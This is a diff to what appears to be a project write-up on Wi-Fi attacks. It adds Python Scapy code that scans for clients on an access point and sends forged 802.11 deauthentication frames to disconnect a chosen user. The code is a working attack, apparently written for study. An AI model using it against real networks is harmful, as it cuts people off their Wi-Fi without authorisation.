@@ -109,9 +109,9 @@ The attacks that we implemented have been chosen in such a way that they resembl
 For this attack, since we wanted to deeply understand the reality of what was happening under the hood, we decided to **ditch the Kali Linux Tool aireplay-ng** and choose to implement our own Python Code using the Scapy Library.
 
 The functions that make the attack works are:
-  • scan for ap(ssid, interface)
-  • scan for clients(ap mac, interface)
-  • disconnect user(target mac, ap mac, interface)
+  - scan for ap(ssid, interface)
+  - scan for clients(ap mac, interface)
+  - disconnect user(target mac, ap mac, interface)
 
 ```python
 def scan_for_ap(ssid, interface):
@@ -133,4 +133,36 @@ def scan_for_ap(ssid, interface):
     return found[0] if found else None
 ```
 
+```python
+def disconnect_user(target_mac, ap_mac, interface):
+    if not target_mac or not ap_mac:
+        print("Error: AP or target MAC address missing!")
+        return
 
+    print(f"Sending deauth attack to {target_mac} from {ap_mac} via {interface}")
+    packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
+    sendp(packet, iface=interface, count=100, inter=0.1, verbose=1)
+```
+
+```python
+def scan_for_clients(ap_mac, interface):
+    print(f"Scanning for clients connected to AP {ap_mac}...")
+    clients_info = {}
+
+    def packet_handler(pkt):
+        if pkt.haslayer(Dot11) and pkt.type == 2 and pkt.addr3 == ap_mac:
+            client = None
+            if pkt.FCfield & 0x01:
+                client = pkt.addr2
+            elif pkt.FCfield & 0x02:
+                client = pkt.addr1
+
+            if client and client != ap_mac:
+                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else "N/A"
+                if client not in clients_info:
+                    print(f"Detected Client: {client}, Signal: {signal}")
+                    clients_info[client] = {'mac': client, 'signal': signal}
+
+    sniff(iface=interface, prn=packet_handler, timeout=15, store=False)
+    return list(clients_info.values())
+```
